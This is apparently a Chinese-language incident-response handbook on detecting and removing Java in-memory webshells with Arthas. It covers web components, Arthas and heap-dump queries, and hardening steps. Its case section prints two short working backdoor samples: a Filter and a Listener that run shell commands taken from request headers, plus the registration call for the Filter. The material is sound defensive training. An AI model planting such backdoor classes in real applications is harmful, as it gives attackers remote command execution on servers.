# Java 内存马排查手册 - Arthas 实战

> 培训内容深化整理：Servlet/Filter/Listener/Interceptor 四大组件、Arthas 命令、内存马查杀流程。
> 适用场景：Java 应用被植入内存马后的应急响应、Shiro 反序列化后清除持久化。

## 一、Java Web 四大组件

### 1. Servlet（请求处理核心）

直接处理 HTTP 请求，返回响应。

```java
@WebServlet("/hello")
public class HelloServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
        resp.getWriter().println("Hello");
    }
}
```

- 包：`javax.servlet.*` / `jakarta.servlet.*`
- 流程：浏览器 → Servlet → 业务处理 → 响应
- 内存马风险：**运行时动态注册 Servlet**（如 `ServletContext.addServlet`）

### 2. Filter（过滤器）

请求到达 Servlet 前后均会经过，可拦截大量请求。

```java
@WebFilter("/*")
public class AuthFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain)
            throws IOException, ServletException {
        System.out.println("请求进入");
        chain.doFilter(req, resp);   // 继续执行后续
        System.out.println("响应返回");
    }
}
```

- 常用于：鉴权、编码、日志、跨域
- 内存马风险：**Filter 型内存马最常见**（拦截所有 URL，隐蔽性高）

### 3. Listener（监听器）

监听 Web 应用生命周期事件。

| Listener 类型 | 监听对象 | 用途 |
|---|---|---|
| `ServletContextListener` | Web 应用 | 启动/关闭钩子 |
| `ServletRequestListener` | 每次请求 | 请求生命周期 |
| `HttpSessionListener` | Session | 在线人数统计 |
| `ServletRequestAttributeListener` | 请求属性 | 属性变更 |

- 内存马风险：动态添加 `ServletRequestListener`，从每个请求读取命令头

### 4. Interceptor（拦截器，Spring MVC）

不属于 Servlet 标准，是 Spring MVC 框架概念。

```java
public class LoginInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest req, HttpServletResponse resp, Object handler) {
        // Controller 执行前
        return true;   // true=继续  false=阻断
    }
}
```

- 接口：`org.springframework.web.servlet.HandlerInterceptor`
- 内存马风险：向 `HandlerMapping` 动态注入恶意 Interceptor

## 二、请求处理顺序（必背）

```
客户端
  ↓
Tomcat
  ↓
Listener (ServletRequestListener.requestInitialized)
  ↓
Filter
  ↓
DispatcherServlet (Spring MVC)
  ↓
Interceptor.preHandle()
  ↓
Controller
  ↓
Interceptor.postHandle()
  ↓
Interceptor.afterCompletion()
  ↓
Filter
  ↓
Listener (ServletRequestListener.requestDestroyed)
  ↓
客户端
```

## 三、Arthas 核心命令

### 安装与启动

```bash
# 上传到靶机
scp -r arthas-bin root@target:/tmp

# 定位 Java 进程
find / -name java 2>/dev/null
jps -l

# 启动（指定 PID）
/usr/local/openjdk-8/bin/java -jar arthas-boot.jar <PID>
```

### 四大组件搜索命令

```arthas
# 按类名模式搜索已加载类（不严格按接口）
sc *Servlet
sc *Filter
sc *Listener
sc *Interceptor
```

**⚠️ 注意**：`sc *Filter` 只匹配类名含 Filter 的类，**不一定实现了 Filter 接口**。
例如 `public class EvilRequestProcessor implements Filter` 类名不含 Filter，搜不到。

### 精确排查命令

```arthas
# 查看类详细信息：接口、类加载器、代码来源
sc -d com.example.SomeFilter

# 反编译查看源码
jad com.example.SomeFilter

# 查看类加载器
classloader

# 查看方法调用栈
stack com.example.SomeFilter doFilter

# 监控方法出入参
watch com.example.SomeFilter doFilter "{params, returnObj}" -x 2
```

### `sc -d` 关键字段

| 字段 | 含义 | 可疑特征 |
|---|---|---|
| `interfaces` | 实现的接口 | 含 `javax.servlet.Filter` 但类名怪异 |
| `classLoaderHash` | 类加载器 hash | 与业务 ClassLoader 不一致（可能是 WebAppClassLoader 临时加载） |
| `code-source` | 代码来源 | `null` 或非 JAR 路径 → 内存中动态生成 |

## 四、内存马排查完整流程

### 步骤 1：定位 Java 进程

```bash
jps -l                    # 列出 Java 进程
pgrep -f 'java.*-jar'     # fallback
```

### 步骤 2：Arthas 全量搜索

```arthas
sc *Servlet
sc *Filter
sc *Listener
sc *Interceptor
```

### 步骤 3：逐一查看可疑类

```arthas
sc -d <可疑类名>
jad <可疑类名>
```

**可疑特征**：
- 类名异常（如 `AntSwordServlet`、`cmdFilter`、随机字符串）
- `code-source` 为 `null` 或 `file:/tmp/xxx`
- `interfaces` 含 Servlet/Filter/Listener 但类名不含
- 反编译后含 `Runtime.getRuntime().exec`、`defineClass`、`eval`

### 步骤 4：dump heap 配合 MAT 分析

```arthas
# 导出堆内存
heapdump /tmp/heapdump.hprof
```

下载到本地，用 **MAT (Memory Analyzer Tool)** 打开，执行 OQL：

```sql
-- 查找所有 Filter 实例
SELECT * FROM instanceof javax.servlet.Filter

-- 查找特定类（如 AntSword 内存马）
SELECT * FROM instanceof com.summersec.x.AntSwordServlet

-- 查找所有动态注册的 ServletRegistration
SELECT * FROM org.apache.catalina.core.StandardServletRegistration
```

### 步骤 4 替代：无 GUI 环境用 jhat（CLI OQL 查询）

MAT 是 GUI 工具，无头服务器/容器无法使用。JDK 自带 `jhat` 可命令行查询：

```bash
# jhat 是 JDK 自带工具，启动 OQL 查询服务（默认端口 7000）
jhat -port 7000 /tmp/heapdump.hprof
# 输出: Reading from /tmp/heapdump.hprof...
#       Dump file created ... 
#       Snapshot resolved.
#       Started HTTP server on port 7000
#       Server is ready.

# 在另一终端用 curl 执行 OQL 查询
# 查找所有 Filter 实例
curl -s "http://localhost:7000/oql/?query=select+s+from+javax.servlet.Filter+s" | head -100

# 查找 AntSword 内存马
curl -s "http://localhost:7000/oql/?query=select+s+from+com.summersec.x.AntSwordServlet+s"

# 查找所有 ClassLoader（可疑动态加载）
curl -s "http://localhost:7000/oql/?query=select+s+from+java.lang.ClassLoader+s" | grep -i "webapp\|tmp\|evil"

# 浏览器也可访问（如果端口转发）：http://localhost:7000/
```

**新手提示**：jhat 启动较慢（大 heapdump 需几分钟），但无需安装额外软件，JDK 自带。查询语法与 MAT OQL 一致。

#### 替代方案 2：Arthas ognl 直接查询（无需导出 heapdump）

```arthas
# 直接用 Arthas ognl 命令查询 Spring 上下文中的 Filter
ognl '@org.springframework.web.context.ContextLoader@getCurrentWebApplicationContext().getBean("requestMappingHandlerMapping").getHandlerMappings()'

# 查询 ServletContext 中的 Filter 注册
ognl '#req=@org.springframework.web.context.request.RequestContextHolder@currentRequestAttributes().getRequest(),
       #req.getServletContext().getFilterRegistrations()'

# 查询所有已加载的 Filter 类
ognl '@java.lang.Thread@currentThread().getContextClassLoader().getLoadedClasses().?[name.indexOf("Filter")!=-1]'
```

### 步骤 5：清除内存马

Arthas 本身不能直接卸载已注册的组件，需要：

```arthas
# 方案 A：通过反编译定位触发点，配合业务代码删除持久化
jad <恶意类>

# 方案 B：重启应用（最彻底，但丢失内存证据）
# 方案 C：通过 OGNL 修改字段移除注册（高阶）
ognl '@org.springframework.web.context.ContextLoader@getCurrentWebApplicationContext().getBean("requestMappingHandlerMapping").getHandlerMappings()'
```

## 五、典型内存马案例

### 案例 1：AntSword Servlet 型内存马（Shiro 反序列化注入）

**注入路径**：Shiro 反序列化 → `com.summersec.x.AntSwordServlet` 注册到 ServletContext

**排查命令**：
```arthas
sc -d com.summersec.x.AntSwordServlet
jad com.summersec.x.AntSwordServlet
```

**MAT 确认**：
```sql
SELECT * FROM instanceof com.summersec.x.AntSwordServlet
```

**反编译路径与 webshell 密码**：jad 输出可能与实际不符（攻击者用反射动态修改），需以 heapdump 为准。

### 案例 2：Filter 型内存马（隐蔽拦截）

```java
// 攻击者代码示例
public class EvilFilter implements Filter {
    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) {
        String cmd = ((HttpServletRequest)req).getHeader("X-Cmd");
        if (cmd != null) {
            byte[] b = Runtime.getRuntime().exec(cmd).getInputStream().readAllBytes();
            resp.getOutputStream().write(b);
            return;   // 不调用 chain.doFilter，直接返回
        }
        chain.doFilter(req, resp);
    }
}
// 注册：servletContext.addFilter("eviL", new EvilFilter())
//      .addMappingForUrlPatterns(EnumSet.of(DispatcherType.REQUEST), false, "/*");
```

**特征**：URL 模式 `/*`，类名可能伪装为 `AuthFilter` / `LogFilter`。

### 案例 3：Listener 型（请求监听）

```java
public class EvilListener implements ServletRequestListener {
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest)sre.getServletRequest();
        String cmd = req.getHeader("X-Exec");
        if (cmd != null) Runtime.getRuntime().exec(cmd);
    }
}
```

**特征**：每个请求都触发，常配合特定 Header 触发。

## 六、防御建议

1. **WAF 拦截**：拦截 `/arthas`、`arthas-boot.jar` 下载路径（见 WAF 规则 `java_10`）
2. **进程监控**：监控 `java -jar arthas-boot.jar` 进程启动
3. **文件完整性**：JAR 文件哈希校验，防止被解包篡改
4. **JVM 启动参数**：`-XX:+DisableAttachMechanism` 禁用 Arthas attach（影响诊断）
5. **Shiro key 轮换**：内存马常通过 Shiro 反序列化注入，轮换默认 key 切断入口
6. **Actuator 关闭**：heapdump 端点是注入内存马的捷径

## 七、相关加固项

| 加固项 ID | 作用 |
|---|---|
| `java_memshell_scan` | 自动上传 arthas 执行 sc/jad 扫描 |
| `java_shiro_key` | Shiro 默认 key 检查（切断注入入口） |
| `java_heapdump_clean` | 清理已泄漏的 heapdump 文件 |

## 八、参考

- 培训 PDF：java(1).pdf、应急响应.pdf（Shiro-内存马查杀章节）
- Arthas 官方文档：https://arthas.aliyun.com/doc/
- MAT 下载：https://www.eclipse.org/mat/
